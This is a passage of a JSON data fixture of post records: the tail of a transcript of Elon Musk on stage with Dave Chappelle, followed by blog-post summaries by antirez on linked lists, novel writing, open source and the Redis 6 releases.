happy. Amen. Thank you very much San Francisco. No city on earth has ever been kind to me. Thank you. Good night.  Video 3 [lots of empty seats in the crowd at this point]  Dave: [unintelligible] as you can. It's funnier when you say it. Are you ready? Say this [unintelligible] you say. Go ahead. Crowd: [weak laugther] Maybe Chris Rock?: I'm rich bitch Crowd: [loud cheers, loud horn from stage can be heard as well] Unknown: Wait wait wait wait [hands mic to Elon] Crowd: [laughter] Elon: [poses] Crowd: [laughter, booing starts to be heard over laughter] Elon: I'm rich bitch Crowd: [some sound, hard to hear over horns from stage followed by music from the DJ drowning out the crowd; sounds like some booing and some cheering]  Video 4  Dave: Talib Kweli my good friend [crowd cheers] is currently banned from Twitter. Crowd: [laughter] Dave: He goes home to [unintelligible], Kweli. [hands mic to Elon] Elon: Ahh waa. Twitter cu-customer service right here. Crowd: [weak laughter] Elon: We'll get right on that. Crowd: [weak booing, gets stronger over time through next statement, until cut off by Dave] Elon: Dave, you should be on Twitter. Dave: If you. Let me tell you something. Wait. Radio, where's your phone? Dave: Listen. Years ago, this is true, I'll tell you two quick Twitter stories then we'll go home. Crowd: [weak laughter] Dave: Years ago, I went to love on the Twitter. I put my name in, and it said that you can't use famous people's names. Crowd: [weak laughter] Dave: And that my name was already in use, it's true. Dave: So I look online to see who's using my name and it turns out it was a fake Dave Chappelle. And I was like, what the fuck? And I started to shut him down, but I read the n***** tweets. And this is shocking. This motherfucker, Elon, was hilarious. Crowd: [weak laughter, someone yells out \"damn right\"] Dave: So I figured, you know what, I'm gonna let him drop. And everybody will think I'm saying all this funny shit, and I don't even have to say this stuff. And it was great. Every morning I wake up and get some coffee and laugh at fake Dave Chappelle's tweets. Dave: But then Crowd: [loud sounds, can hear someone say \"whoa\"] Dave: [blocks stage light with hand so he can see into the crowd, looks into crowd] Fight. Will you cut that shit out, you anti-[unintelligible; lots of people are reporting this as facist, which is plausible, making the statement about \"anti-facists\"] n*****? Crowd: [loud sounds, can hear some jeers and boos]", "content": "", "cover_photo_url": null, "profile": 7, "updated_on": "2022-12-11T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 0.0, "slug": "transcript-of-elon-musk-on-stage-with-dave-chapelle-1", "topics": []}}, {"model": "app.post", "pk": 2, "fields": {"title": "In defense of linked lists", "link": "http://antirez.com/news/138", "source": 1, "normalized_link": "antirez.com/news/138", "summary": "A few days ago, on Twitter (oh, dear Twitter: whatever happens I\u2019ll be there as long as possible \u2013 if you care about people that put a lot of energy in creating it, think twice before leaving the platform). So, on Twitter, I was talking about a very bad implementation of linked lists written in Rust. From the tone of certain replies, I got the feeling that many people think linked lists are like a joke. A trivial data structure that is only good for coding interviews, otherwise totally useless. In a word: the bubble sort of data structures. I disagree, so I thought of writing this blog post full of all the things I love about linked lists.  So, get ready to read a sentimental post about a data structure, and don't tell I didn't warn you.  Linked lists are educational. When your teacher, or the page of a book, or anything that exposes you for the first time to linked lists shows you this little circle with an arrow pointing to another circle, something immense happens in your mind. Similar to what happens when you understand recursion for the first time. You get what data structures made of links truly are: the triviality of a single node that becomes a lot more powerful and complex once it references another one. Linked lists show the new programmer fundamental things about space and time in computation: how it is possible to add elements in a constant time, and how order is fundamentally costly, because if you want to insert an element \u201cin place\u201d you have to go from one node to the other. You immediately start thinking of ways to speed up the process (preparing you for the next things), and at the same time you understand, deeply, what O(1) and O(N) really mean.  Linked lists are augmentable. Add a pointer to the previous element, and now it is possible to go both sides. Add \u201cfar\u201d pointers from time to time, and you have a skip list with completely different properties. Change every node to hold multiple items and your linked list becomes unrolled, providing very different cache obviousness properties. Linked lists can be embedded, too. The Linux kernel, for instance, has macros to add a field to any structures in order to link them together. There is more: linked lists are composable. This is a bold property: you can split a linked list into two in O(1), and you can glue two linked lists in O(1) as well. If you make judicious use of this property, interesting things are possible. For instance, in Redis modules implementing threaded operations, the thread processing the slow request dealt with a fake client structure (this way there was no locking, no contention). When the threaded command finally ended its execution, the output buffer of the client could be glued together to the actual buffer of the real client. This was easy because the output buffer was represented with a linked list.  Linked lists are useful: Redis can be wrong, but both Redis and the Linux kernel can\u2019t. They are useful because they resemble certain natural processes: adding things in the order they arrive, or in the reverse order, is natural even in the physical world. Pulling items incrementally is useful too, as it is moving such items from head to tail, or moving them a position after the current one.  Linked lists are simple. It is one of those rare data structures, together with binary trees and hash tables and a few more, that you can implement just from memory without likely stepping into big errors.  Linked lists are conceptual. A node pointing to itself is the most self centered thing I can imagine in computing: an ideal representation of the more vulgar infinite loop. A node pointing to NULL is a metaphor of loneliness. A linked list with tail and head connected, a powerful symbol of a closed cycle.  For all those reasons, I love linked lists, and I hope that you will, at least, start smiling at them. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2022-11-04T18:46:29Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11857.1807189, "slug": "in-defense-of-linked-lists-2", "topics": []}}, {"model": "app.post", "pk": 3, "fields": {"title": "Scrivendo Wohpe", "link": "http://antirez.com/news/137", "source": 1, "normalized_link": "antirez.com/news/137", "summary": "(English translation of this post: http://antirez.com/news/136)  Dopo due anni di lavoro, finalmente, Wohpe, il mio primo libro di fantascienza, ma anche il mio primo scritto di prosa di questa lunghezza, \u00e8 uscito nelle librerie fisiche italiane, su Amazon, e negli altri store digitali. Lo trovate qui: https://www.amazon.it/Wohpe-Salvatore-Sanfilippo/dp/B09XT6J3WX  Dicevo: il primo scritto di questa lunghezza. Ma posso considerarmi del tutto nuovo alla scrittura? Ho scritto per vent\u2019anni in questo blog e in quelli passati che ho tenuto nel corso del tempo, e molto spesso ho usato Facebook per scrivere brevi racconti, frutto di fantasie o basati su fatti reali. Oltre a ci\u00f2,\u00a0ho scritto di cose tecniche, specialmente riguardo la programmazione, per un tempo altrettanto lungo, e sono stato un lettore di racconti e di romanzi per tutto il corso della mia vita. E allora perch\u00e9 scrivere Wohpe \u00e8 stato anche imparare a scrivere da zero?  Nei primi mesi di scrittura del romanzo, ma anche prima, nei mesi precedenti, quando mi preparavo scrivendo lunghi racconti che poi avrei cestinato, mi \u00e8 successo ci\u00f2\u00a0che accade spesso a coloro che imparano a giocare a scacchi. Tanti seguono questo percorso: imparano le regole, e va bene, lo sappiamo che con quelle si fa poco; le regole permettono solo di muovere i pezzi in maniera legale. Ma poi, subito dopo, imparano dei rudimenti di tecnica e di strategia, magari studiando duramente per qualche settimana. Per\u00f2\u00a0quando sono alla scacchiera, se una mossa non \u00e8 brutalmente peggiore o migliore di un\u2019altra, tutte le mosse sembrano equivalenti. Il giocatore di scacchi poco abile, poco esperto, non ha un vero gusto per le mosse; non riesce a valutarle non solo per ci\u00f2 che sono in termini assoluti, ma neanche secondo una sua propria idea. Il risultato \u00e8 un gioco casuale. Solo pi\u00f9\u00a0avanti, dopo molte ore di gioco, ella finalmente riuscir\u00e0\u00a0a esprimere delle scelte che, a prescindere dal fatto siano esse giuste o sbagliate, hanno quantomeno una coerenza, sono state davvero pensate: voglio muovere il cavallo qui, per queste precise ragioni, e per tali ragioni preferisco questa mossa a tutte le altre possibili.  Cos\u00ec\u00a0chi scrive ed \u00e8 agli inizi, se una frase \u00e8 buona, con certezza non lo sa (e per continuare col paragone di sopra, cos\u00ec come il gioco dello scacchista sar\u00e0 casuale, la sua scrittura sar\u00e0 casuale). Sposta una virgola, cambia una parola. Suona bene o male? Ha delle idee che si \u00e8 formato scrivendo a scuola e poi scrivendo da adulto, ma queste idee lo assistono poco quando l\u2019ambizione \u00e8 quella di scrivere una prosa di livello letterario. L\u2019autore alle prime armi non ha un suo stile, perch\u00e9 prima di non saper scrivere non sa ancora leggere: quando legge un libro che adora, raramente capisce esattamente *cosa* accade nella pagina di cos\u00ec\u00a0convincente, e cos\u00ec anche quando rilegge se stesso, non sa se ha scritto bene o male. Leggi, se vuoi imparare a scrivere! Dicono tutti. Peccato non sia vero: bisogna prima di tutto scrivere per imparare a scrivere, cos\u00ec\u00a0come bisogna fare dei cortometraggi per imparare a fare il regista, e guardare gli altri film non sar\u00e0 sufficiente (anche se sar\u00e0 certamente utile). E per imparare a scrivere, il tipo di lettura che serve davvero \u00e8\u00a0la rilettura di alcuni libri che abbiamo scelti come modelli; quello s\u00ec che \u00e8 utile: la rilettura per comprenderne le forme, fino in fondo. Ora questo semplice fatto, di aver capito quale sia il mio stile, e di saper finalmente leggere e avere un giudizio che emerge immediatamente quando ho tra le mani un\u2019opera, \u00e8 gi\u00e0\u00a0un risarcimento pi\u00f9\u00a0che sufficiente dei due anni di sforzi di scrittura nei quali mi sono profuso.  Ed \u00e8 una vera fortuna che l\u2019esperienza in s\u00e9 sia stata di cos\u00ec\u00a0grande valore, perch\u00e9 quello che molti nuovi autori non sanno \u00e8 quanto violento possa essere il mercato editoriale mondiale, e quello italiano in particolare. In Italia un libro di fantascienza che ha un buon successo, edito da un piccolo o medio editore, vende 500 copie. Deve andare bene, per avere questi numeri. La gran parte dei libri vende meno di 100 copie. A noi informatici queste cifre fanno rabbrividire. Il pi\u00f9 stupido programma che ho scritto ha avuto dieci volte pi\u00f9 utenti. Mi spingerei a dire che il pi\u00f9 stupido programma che ho scritto e che ho pubblicato con un minimo di energie, ha avuto dieci volte questi *lettori*, gente che ne hanno letto il codice sorgente per capire come funzionasse. Io sono stato, e per questo ringrazio non so bene chi, un programmatore di una certa notoriet\u00e0, direte voi. Ci\u00f2 che voglio dire va molto oltre la mia esperienza personale. Anche coloro che non sono conosciuti da nessuno e provano a fare, nella programmazione, una cosa mediamente interessante, appena ben descritta e documentata, e la mostrano un po\u2019 in giro, ricevono un interesse enorme rispetto a quello che spetta agli autori di fiction. I motivi sono tanti e abbastanza ovvi, non vale neppure la pena di soffermarsi su di essi, dunque perch\u00e9 vi racconto queste cose? Per questo motivo:  Sono poche le attivit\u00e0, oltre alla letteratura, dove\u00a0c\u2019\u00e8 lo stesso mostruoso scompenso tra le forze necessarie per produrre un\u2019opera e la scarsa risposta del pubblico. Chi decide di dedicare molto tempo alla scrittura, deve conoscere questo fatto da subito. Io per fortuna sapevo gi\u00e0 tutto, grazie ai miei amici scrittori; per\u00f2\u00a0lo stesso certe sfumature di questa irrilevanza finiscono per essere difficili da accettare.  E allora perch\u00e9 tutti scrivono? Sono straripanti le file di quelli che tentano la fortuna editoriale. Credo sia un meccanismo simile a quello che accade nell\u2019IT, con tanti che provano a creare un nuovo linguaggio di programmazione: il fallimento \u00e8 quasi certo, ma il tentativo stesso \u00e8 una delle imprese pi\u00f9 soddisfacenti alle quali dedicare le proprie migliori energie.  Ora sono a un bivio: potrei scrivere altra prosa, rimettermi a scrivere codice, o provare a tenere vive le due attivit\u00e0 allo stesso tempo. Cosa far\u00f2 non lo so ancora. Per ora, vediamo cosa succede con Wohpe, sia con la versione italiana che con la traduzione in inglese, a cui in questo momento una capace traduttrice sta lavorando. E su questa cosa delle traduzioni, eseguite col supporto dell\u2019autore, e di quale esperienza significativa sia dal punto di vista filologico, magari vi parler\u00f2 qualche altra volta (io e Bridget parliamo l\u2019inglese e l\u2019italiano, ma siamo madrelingua lei di una e io dell\u2019altra lingua, e ci\u00f2\u00a0\u00e8 molto interessante quando si collabora tra traduttore e autore). Chiudo il post dicendo a chi mi legge: se ne avete voglia, scrivete prosa! Io ora lo so per certo: non \u00e8 un caso che la scrittura sia stata per centinaia di anni considerata l\u2019arte pi\u00f9 alta nella quale cimentarsi. Scrivendo si cercano delle cose, e se si insiste abbastanza si finisce per trovarle davvero. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2022-07-17T09:31:34Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11645.24083, "slug": "scrivendo-wohpe-3", "topics": []}}, {"model": "app.post", "pk": 4, "fields": {"title": "Writing Wohpe", "link": "http://antirez.com/news/136", "source": 1, "normalized_link": "antirez.com/news/136", "summary": "(Traduzione italiana di questo post: http://antirez.com/news/137)  [Sorry for the form of this post. For the first time I wrote a post in two languages: Italian and English. So I went for the unusual path of writing it in Italian to start, translating it with Google Translate, and later I just scanned it to fix the biggest issues. At this point GT is so good you can get away with this process.]  After two years of work, finally, Wohpe, my first science fiction book, but also my first prose writing of this length, has been released in Italian physical bookstores, on Amazon, and in other digital stores. You can find it here: https://www.amazon.it/Wohpe-Salvatore-Sanfilippo/dp/B09XT6J3WX  I was saying: the first writing of this length. But can I consider myself entirely new to writing? I have written for twenty years in this blog and in the past ones that I have kept over time, and very often I have used Facebook to write short stories, the result of fantasies or based on real facts. On top of that, I've been writing about technical stuff, especially programming, for an equally long time, and I've been a short story and novel reader my entire life. So why was writing Wohpe also learning how to write from scratch?  In the first months of writing the novel, but also earlier, in the previous months, when I was preparing myself by writing long stories that I would then throw away, what happened to me often happens to those who learn to play chess. Many follow this path: they learn the rules, and that's okay, we know that you don't do much with them; the rules only allow you to move pieces legally. But then, soon after, they learn some rudiments of tactics and strategy, perhaps studying hard for a few weeks. But when they are on the board, if one move is not brutally worse or better than another, all the moves seem equivalent. The unskilled, inexperienced chess player has no real taste for moves; she fails to evaluate them not only for what they are in absolute terms, but not even according to his own idea. The result is a casual game. Only later, after many hours of play, will she finally be able to express choices that, regardless of whether they are right or wrong, have at least a coherence, they were really thought: I want to move the horse here, for these precise reasons, and for these reasons I prefer this move to all other possible ones.  So whoever writes and is at the beginning, if a sentence is good, he certainly does not know it (and to continue with the above comparison, just as the chess player's game will be casual, his writing will be casual). Move a comma, change a word. Does it sound good or bad? He has ideas that he formed by writing at school and then writing as an adult, but these ideas help him little when the ambition is to write a literary level prose. The novice author does not have his own style, because before not knowing how to write he does not yet know how to read: when he reads a book he adores, he rarely understands exactly * what * happens on the page that is so convincing, and so also when he re-reads himself, he does not know if he wrote well or badly. Read, if you want to learn to write! They all say. Too bad it's not true: first of all you have to write, to learn how to write, just as you have to make short films to learn to be a director, and watching other films will not be enough (although it will certainly be useful). And to learn to write, the kind of reading that is really needed is the rereading of some books that we have chosen as models; what is useful: the rereading to fully understand its forms. Now this simple fact, of having understood what my style is, and of finally knowing how to read and have a judgment that immediately emerges when I have a work in my hands, is already more than enough compensation for the two years of writing efforts in which I have lavished.  And it is fortunate that the experience itself was of such great value, because what many new authors do not know is how violent the world publishing market can be, and the Italian one in particular. In Italy a science fiction book that has a good success, published by a small or medium publisher, sells 500 copies. It has to be fine to have these numbers. Most books sell less than 100 copies. To us computer scientists these figures make us shiver. The stupidest program I wrote had ten times as many users. I would go as far as to say that the stupidest program I've written and published with a minimum of energy has had these * readers * ten times, people who have read its source code to understand how it works. I have been, and for this I thank I don't know who, a programmer of a certain notoriety, you might say. What I mean is far beyond my personal experience. Even those who are not known by anyone and try to do something on average interesting, just well described and documented, in programming, and show it around a bit, receive enormous interest compared to what belongs to the authors of fiction. The reasons are many and quite obvious, it is not even worth dwelling on them, so why am I telling you these things? For this reason:  There are few activities, besides the literature, where there is the same monstrous imbalance between the forces needed to produce a work and the poor response of the public. Anyone who decides to devote a lot of time to writing must know this fact right away. Fortunately, I already knew everything, thanks to my writing friends; however, certain nuances of this irrelevance end up being difficult to accept.  So why is everyone writing? The ranks of those who try their editorial fortune are overflowing. I think it's a similar mechanism to what happens in IT, with many trying to create a new programming language: failure is almost certain, but doing so is one of the most satisfying companies to devote your best energy to.  Now I'm at a crossroads: I could write more prose, get back to coding, or try to keep the two activities alive at the same time. What I'll do I don't know yet. For now, let's see what happens with Wohpe, both with the Italian version and with the English translation, which a capable translator is working on right now. And on this matter of the translations, carried out with the support of the author, and what a significant experience it is from the philological point of view, maybe I will talk to you some other time (Bridget and I speak English and Italian, but we are native speakers of one and I of the other language, and this is very interesting when collaborating between translator and author). I close the post by saying to those who read me: if you feel like it, write prose! I now know for sure: it is no coincidence that for hundreds of years writing has been considered the highest art in which to try one's hand. By writing you look for things, and if you insist enough you end up really finding them. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2022-07-17T09:31:06Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11645.2402078, "slug": "writing-wohpe-4", "topics": []}}, {"model": "app.post", "pk": 5, "fields": {"title": "Programming and Writing", "link": "http://antirez.com/news/135", "source": 1, "normalized_link": "antirez.com/news/135", "summary": "One year ago I paused my programming life and started writing a novel, with the illusion that my new activity was deeply different than the previous one. A river of words later, written but more often rewritten, I\u2019m pretty sure of the contrary: programming big systems and writing novels have many common traits and similar processes.  The most obvious parallel between the two activities is that in both of them you write something. Code is not prose written in a natural language, yet it has a set of fixed rules (a grammar), certain forms that most programmers will understand as natural and others that, while formally correct, will sound hard to grasp. There is, however, a much deeper connection between the two activities: a good program and a good novel are both the sum of local and global elements that work well. Good code must be composed of well written and readable single statements, but overall the different parts of the program must be orthogonal, designed in a coherent way, and have clean interactions. A good novel must also succeed in the same two scales of the micro and the macro. Sentences must be well written, but the overall structure and relationship between the parts is also crucial.  A less structural link between programming and writing is in the drive you need when approaching one or the other: to succeed you need to make progresses, and to make progresses you have to be consistent. There is extensive agreement on the fact that programs and novels don\u2019t write themselves, yet. Twenty years of writing code helped me immensely with this aspect; I knew that things happen only if you sit every day and write: one day one hundred words, the other day two thousands, but rare is the day I don\u2019t put words on the page. And if you have written code that is not just a \u201cfiller\u201d for a bigger system, but a creation of your own, you know that writer block also happens in programming. The only difference is that for most people you are an engineer, hence, if you don\u2019t work, you are lazy. The same laziness, in the case of an artist, will assume the shape of a fascinating part of the creative process.  The differences.  I believe the most sharp difference between writing and programming is that, once written, edited and finalized, a novel remains immutable, mostly. There are several cases of writers returning on their novels after several years, publishing a bug fixed version of it, but this is rare and, even when happens, a one-shot process. Code evolves over time, is targeted by an endless stream of changes, often performed by multiple people. This simple fact has profound effects on the two processes: programmers often believe that the first version of a system can be quite imperfect; after all there will be time to make improvements. On the other hand writers know they have a single bullet for every novel, to the point that writing prose is mostly the act of rewriting. Rewriting sentences, whole chapters, dialogues that sound fake, sometimes two, three, or even ten times.  I believe programming, in this regard, can learn something from writing: when writing the first core of a new system, when the original creator is still alone, isolated, able to do anything, she should pretend that this first core is her only bullet. During the genesis of the system she should rewrite this primitive kernel again and again, in order to find the best possible design. My hypothesis is that this initial design will greatly inform what will happen later: growing organically something that has a good initial structure will result in a better system, even after years of distance from the original creation, and even if the original core was just a tiny faction of the future mass the system would eventually assume.  In case you are interested, a quick update about my sci-fi novel. After many self-reviews I sent the manuscript to my editor, Giulio Mozzi. He will send me the change proposals in a few weeks. I\u2019ll start a new review process informed by his notes, and hopefully finalize the novel in one or two months. Then, finally, I\u2019ll be ready to publish the Italian version. A the same time the finalized novel will be sent to my translator, in the US, and when she ends the translation the English version will be published as well. It\u2019s a long journey, but one that I deeply enjoyed taking. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2021-05-14T09:47:18Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10821.5818078, "slug": "programming-and-writing-5", "topics": []}}, {"model": "app.post", "pk": 6, "fields": {"title": "The open source paradox", "link": "http://antirez.com/news/134", "source": 1, "normalized_link": "antirez.com/news/134", "summary": "A new idea is insinuating in social networks and programming communities. It\u2019s the proportionality between the money people give you for coding something, and the level of demand for quality they can claim to have about your work.  As somebody said, the best code is written when you are supposed to do something else [1]. Like a writer will do her best when writing that novel that, maybe, nobody will pay a single cent for, and not when doing copywriting work for a well known company, programmers are likely to spend more energies in their open source side projects than during office hours, while writing another piece of a project they feel stupid, boring, pointless. And, if the company is big enough, chances are it will be cancelled in six months anyway or retired one year after the big launch.  Open source is different, it\u2019s an artifact, it\u2019s a transposition in code of what you really want to do, of what you feel software should be, or just of all your fun and joy, or even anger you are feeling while coding. And you want it to rock, to be perfect, and you can\u2019t sleep at night if there is a fucking heisenbug. So if a user of your software is addressing you because some part of your code sucks, and is willing to work with you to do something about it, and is very demanding, don\u2019t think they are abusing you because they are not paying you. It\u2019s not about money. You can ignore bugs if you want, and ignore their complains, you can do that since you don\u2019t have a contract to do otherwise, but they are helping you, they care about the same thing you care: your software quality, grandiosity, perfection.  The real right you have, and often don\u2019t exploit, is that you are the only one that can decide about the design of your software. So you are entitled to refuse a pull request, or a proposal to follow good practices, because you feel that what somebody is contributing does not fit in the big picture of what you are designing and building.  But if you recognize that somebody is talking you about something that is, really, a defect in your software, don\u2019t do the error of reducing the interaction to a vile matter of money. You are doing work for free, they are risking their asses deploying what you wrote, you both care about quality.  EDIT: If you write OSS and you are upset about user demands, have you ever thought that maybe, at this point, your work is more similar to office work for some reason?  EDIT 2: A HN user asked the reasons for such title. The paradox is that the OSS writer cares and is often willing to fix code she writes for free, more than the other paid work she does.  [1] \"The best programs are the ones written when the programmer is supposed to be working on something else.\" - Melinda Varian. https://twitter.com/CodeWisdom/status/1309470447667421189 Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2020-10-03T09:11:59Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10393.3747189, "slug": "the-open-source-paradox-6", "topics": []}}, {"model": "app.post", "pk": 7, "fields": {"title": "The end of the Redis adventure", "link": "http://antirez.com/news/133", "source": 1, "normalized_link": "antirez.com/news/133", "summary": "When I started the Redis project more than ten years ago I was in one of the most exciting moments of my career. My co-founder and I had successfully launched two of the major web 2.0 services of the Italian web. In order to make them scalable we had to invent many new concepts, that were already known in the field most of the times, but we didn\u2019t know, nor we cared to check. Problem? Let\u2019s figure out a solution. We wanted to solve problems but we wanted, even more, to have fun. This was the playful environment where Redis was born.  But now Redis is, incredibly, one of the main parts of so many things. And year after year my work changed from building this thing to making sure that it was also as useful as possible, as reliable as possible. And in recent years, what I do every day changed so much that most of my attention is spent in checking what other developers tell me about the Redis code, how to improve it, the changes it requires to be more correct or faster or more secure. However I never wanted to be a software maintainer.  I write code in order to express myself, and I consider what I code an artifact, rather than just something useful to get things done. I would say that what I write is useful just as a side effect, but my first goal is to make something that is, in some way, beautiful. In essence, I would rather be remembered as a bad artist than a good programmer. Now I\u2019m asked more and more, by the circumstances created by a project that became so important, to express myself less and to maintain the project more. And this is indeed exactly what Redis needs right now. But this is not what I want to do, and I stretched myself enough during the past years.  So, dear Redis community, today I\u2019m stepping back as the Redis maintainer. My new position will be, on one side, an \u201cideas\u201d person at Redis Labs, in order to provide inputs for new Redis possibilities: I\u2019ll continue to be part of the Redis Labs advisory board. On the other hand however my hands will be free, and I\u2019ll do something else, that could be writing code or not, who knows, I don\u2019t want to make plans for now. However I\u2019m very skeptical about me not writing more code in the future. It\u2019s just too much fun :D  I leave Redis in the hands of the Redis community. I asked my colleagues Yossi Gottlieb and Oran Agra to continue to maintain the project starting from today: these are the people that helped me the most in recent years, and that tried hard, even when it was not \u201clinear\u201d to follow me in my very subjective point of views, to understand what my vision on Redis was. Since I don\u2019t want to be part of how the new Redis development setup will be shaped (that is the most meta of the maintenance tasks, exactly what I want to avoid), I\u2019ll just leave Yossi and Oran the task of understanding how to interface with the rest of the Redis developers to find a sustainable development model, you can hear directly from Yossi and Oran in this blog post: https://redislabs.com/blog/new-governance-for-redis/  I believe I\u2019m not just leaving Redis in the hands of a community of expert programmers, but also in the hands of people who care about the legacy of the community spirit of Redis. In eleven years I hope I was able to provide a point of view that certain persons understood, about an alternative way to write software. I hope that such point of view will be taken into consideration in the evolution of Redis.  Redis was the most stressful thing I did in my career, and probably also the most important. I don\u2019t like much what the underground programming world became in recent years, but even if it was not an easy journey, I had the privilege to work and interact with many great individuals. Thank you for your humanity and your help, and for what you taught me. You know who you are! I want to also say thank you to the companies and individuals inside such companies that allowed me to write open source every day for so many years, with the freedom to do what I believed to be correct for the user base. Redis Labs, VMware and Pivotal, thank you for your great help and generosity.  As I said, I don\u2019t really know what there is for me in my future, other than the involvement with the Redis advisory board. I guess that for some time, just look around is a good idea, without doing too many things. I would like to explore more a few hobbies of mine. Writing blog posts is also a major thing that I wanted to do but did less and less because of time concerns. Recently I published videos in Italian language explaining technological concepts to the general public, I had fun doing that and received good feedbacks, maybe I\u2019ll do more of that as well. Anyway I guess some of you know that I\u2019m active on Twitter as @antirez. If you are interested in what an old, strange programmer will do next, see you there. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2020-06-30T13:00:16Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10211.2790967, "slug": "the-end-of-the-redis-adventure-7", "topics": []}}, {"model": "app.post", "pk": 8, "fields": {"title": "Redis 6.0.0 GA is out!", "link": "http://antirez.com/news/132", "source": 1, "normalized_link": "antirez.com/news/132", "summary": "Finally Redis 6.0.0 stable is out. This time it was a relatively short cycle between the release of the first release candidate and the final release of a stable version. It took about four months, that is not a small amount of time, but is not a lot compared to our past records :)  So the big news are the ones announced before, but with some notable changes. The old stuff are: SSL, ACLs, RESP3, Client side caching, Threaded I/O, Diskless replication on replicas, Cluster support in Redis-benchmark and improved redis-cli cluster support, Disque in beta as a module of Redis, and the Redis Cluster Proxy (now at https://github.com/RedisLabs/redis-cluster-proxy).  So what changed between RC1 and today, other than stability?  1. Client side caching was redesigned in certain aspects, especially the caching slot approach was discarded in favor of just using key names. After analyzing the alternatives, with the help of other Redis core team members, in the end this approach looks better. Other than that, finally the feature was completed with the things I had in the backlog for the feature, especially the \u201cbroadcasting mode\u201d, that I believe will be one of the most popular usage modes of the feature.  When broadcasting is used, the server no longer try to remember what keys each client requested. Instead clients subscribe to key prefixes: they\u2019ll get notifications every time a key matching the prefix is modified. This means more messages (but only for the selected prefixes), but no memory effort in the server side. Moreover the opt-in / opt-out mode is now supported, so it is possible for clients not using the broadcasting mode, to exactly tell the server about what the client will cache, to reduce the number of invalidation messages. Basically the feature is now much better both when a low-memory mode is needed, and when a very selective (low-bandwidth) mode is needed.  2. This was an old request by many users. Now Redis supports a mode where RDB files used for replication are immediately deleted if no longer useful. In certain environments it is a good idea to never have the data around on disk, but just in memory.  3. ACLs are better in a few regards. First, there is a new ACL LOG command that allows to see all the clients that are violating the ACLs, accessing commands they should not, accessing keys they should not, or with failed authentication attempts. The log is actually in memory, so every external agent can call \u201cACL LOG\u201d to see what\u2019s going on. This is very useful in order to debug ACL problems.  But my preferred feature is the reimplementation of ACL GENPASS. Now it uses SHA256 based HMAC, and accepts an optional argument to tell the server how many bits of unguessable pseudo random string you want to generate. Redis seeds an internal key at startup from /dev/urandom, and later uses the HMAC in counter mode in order to generate the other random numbers: this way you can abuse the API, and call it every time you want, since it will be very fast. Want to generate an unguessable session ID for your application? Just call ACL GENPASS. And so forth.  4. PSYNC2, the replication protocol, is now improved. Redis will be able to partially resynchronize more often, since now is able to trim the final PINGs in the protocol, to make more likely that replicas and masters can find a common offset.  5. Redis commands with timeouts are now much better: not only BLPOP and other commands that used to accept seconds, now accept decimal numbers, but the actual resolution was improved in order to never be worse than the current \u201cHZ\u201d value, regardless of the number of clients connected.  6. RDB files are now faster to load. You can expect a 20/30% improvement, depending on the file actual composition (larger or smaller values). INFO is also faster now when there are many clients connected, this was a long time problem that now is finally gone.  7. We have a new command, STRALGO, that implements complex string algorithms. For now the only one implemented is LCS (longest common subsequence), an important algorithm used, among the other things, in order to compare the RNA of the coronaviruses (and in general the DNA and RNA of other organisms). What is happening is too big, somewhat a trace inside Redis needed to remain.  Redis 6 is the biggest release of Redis *ever*, so even if it is stable, handle it with care, test it for your workload before putting it in production. We never saw big issues so far, but make sure to be careful. As we collect bug reports, we will prepare to release Redis 6.0.1 ASAP.  A big thank you to the many people that wrote code with me in this release, and to all the companies that sponsored both my work (Thanks Redis Labs), and the the work of the other contributors (Thanks other companies). Also a big thank you to the many that signaled bugs with care, sometimes following the boring process of reiterating after making some changes, or that suggested improvements of any kind.  As usually you can find Redis 6 in different places: at https://redis.io as tarball, and in the Github repository tagged as \u201c6.0.0\u201d.  Enjoy Redis 6, antirez Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2020-04-30T13:33:35Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10094.2035189, "slug": "redis-600-ga-is-out-8", "topics": []}}, {"model": "app.post", "pk": 9, "fields": {"title": "Redis 6 RC1 is out today", "link": "http://antirez.com/news/131", "source": 1, "normalized_link": "antirez.com/news/131", "summary": "So it happened again, a new Redis version reached the release candidate status, and in a few months it will hit the shelves of most supermarkets. I guess this is the most \u201centerprise\u201d Redis version to date, and it\u2019s funny since I took quite some time in order to understand what \u201centerprise\u201d ever meant. I think it\u2019s word I genuinely dislike, yet it has some meaning. Redis is now everywhere, and it is still considerably able to \u201cscale down\u201d: you can still download it, compile it in 30 seconds, and run it without any configuration to start hacking. But being everywhere also means being in environments where things like encryption and ACLs are a must, so Redis, inevitably, and more than thanks to me, I would say, in spite of my extreme drive for simplicity, adapted.  But what\u2019s interesting is that, even additions may be done in very opinionated ways. Redis ACLs hardly resemble something you saw in other systems, and SSL support was written in a few iterations in order to finally pick the idea that was the most sounding, from the point of view of letting the core as clean as possible. I\u2019m quite happy with the result.  Redis 6 does not bring just ACLs and SSL, it is the largest release of Redis ever as far as I can tell, and the one where the biggest amount of people participated. So, let\u2019s start with credits. Who made Redis 6? This is the list of contributors by commits (it\u2019s a terrible metric, but the one I can easily generate), having at least two commits, and excluding merge commits. Also note that the number of commits in my case may be inflated a lot by the fact that I fix many small stuff here and there constantly.     685  antirez     81  zhaozhao.zz     76  Oran Agra     51  artix     28  Madelyn Olson     27  Yossi Gottlieb     15  David Carlier     14  Guy Benoish     14  Guy Korland     13  Itamar Haber      9  Angus Pearson      8  WuYunlong      8  yongman      7  vattezhang      7  Chris Lamb      5  Dvir Volk      5  